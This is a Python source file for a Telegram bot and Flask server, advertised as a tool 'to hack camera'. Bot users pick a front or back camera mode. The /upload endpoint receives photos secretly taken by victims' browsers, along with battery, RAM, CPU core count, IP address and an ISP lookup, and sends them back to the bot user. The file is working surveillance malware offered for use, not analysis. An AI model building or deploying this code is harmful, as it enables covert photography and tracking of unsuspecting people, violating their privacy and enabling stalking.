import os, base64, threading, sqlite3, time, telebot, requests
from flask import Flask, render_template, request, jsonify
from telebot import types

app = Flask(__name__)
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMINS = [518067190, 7162565886]
TG_CHANNEL = "hackerscolonytech"
YT_LINK = "https://youtube.com/@hackers_colony_tech"

bot = telebot.TeleBot(BOT_TOKEN)

def db_init():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, photo_count INTEGER DEFAULT 0)')
    cursor.execute('CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, total_photos INTEGER DEFAULT 0)')
    cursor.execute('INSERT OR IGNORE INTO stats (id, total_photos) VALUES (1, 0)')
    conn.commit()
    conn.close()

db_init()

def is_user_joined(user_id):
    try:
        member = bot.get_chat_member(f"@{TG_CHANNEL}", user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def start(message):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO users (id) VALUES (?)', (message.chat.id,))
    conn.commit()
    conn.close()
    
    if is_user_joined(message.chat.id):
        show_menu(message.chat.id)
    else:
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("📢 Join Telegram 📢", url=f"https://t.me/{TG_CHANNEL}"),
                   types.InlineKeyboardButton("📺 Subscribe YouTube 📺", url=YT_LINK),
                   types.InlineKeyboardButton("✅ I Have Joined & Subscribed ✅", callback_data="check_join"))
        bot.send_message(message.chat.id, "<b>Welcome to Hacker's Colony! 🎯</b>\n\n⚠️ <b>Must join our channel to use this bot!</b>", parse_mode='HTML', reply_markup=markup)

def show_menu(chat_id):
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front"), 
               types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"))
    markup.add(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
    bot.send_message(chat_id, "<b>Select your camera mode to hack camera 📸:</b>", parse_mode='HTML', reply_markup=markup)

@bot.message_handler(commands=['stats'])
def stats_cmd(message):
    if message.chat.id in ADMINS:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM users')
        u_count = cursor.fetchone()[0]
        cursor.execute('SELECT total_photos FROM stats WHERE id=1')
        p_count = cursor.fetchone()[0]
        conn.close()
        bot.send_message(message.chat.id, f"📊 <b>Bot Stats</b>\n\nTotal Users: {u_count}\nTotal Photos: {p_count}", parse_mode='HTML')

@bot.message_handler(commands=['users'])
def users_cmd(message):
    if message.chat.id in ADMINS:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute('SELECT id, photo_count FROM users')
        rows = cursor.fetchall()
        conn.close()
        with open("user_list.txt", "w") as f:
            f.write("User ID | Photos\n")
            for r in rows: f.write(f"{r[0]} | {r[1]}\n")
        bot.send_document(message.chat.id, open("user_list.txt", "rb"), caption="📄 User Data File")

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    uid = data.get('uid')
    info = data.get('info', {})
    
    isp = "Unknown"
    try: isp = requests.get(f"http://ip-api.com/json/{request.remote_addr}").json().get('isp', 'Unknown')
    except: pass

    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET photo_count = photo_count + 1 WHERE id = ?', (uid,))
    cursor.execute('UPDATE stats SET total_photos = total_photos + 1 WHERE id = 1')
    conn.commit(); conn.close()

    img_data = base64.b64decode(data.get('image').split(',')[1])
    caption = (f"🛡️ <b>Audit:</b> {data.get('mode', 'N/A').upper()}\n"
               f"🔋 <b>Battery:</b> {info.get('battery')}\n"
               f"🧠 <b>RAM:</b> {info.get('ram')} GB\n"
               f"⚙️ <b>Processor:</b> {info.get('cores')} Cores\n"
               f"📶 <b>Network:</b> {isp}\n"
               f"📍 <b>IP:</b> {request.remote_addr}\n\n"
               f"✨ Created by Roshan ✨")
    bot.send_photo(uid, img_data, caption=caption, parse_mode='HTML')
    return jsonify({"status": "success"})

if __name__ == "__main__":
    def run_bot():
        while True:
            try: bot.polling(none_stop=True)
            except: time.sleep(5)
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=10000)
    
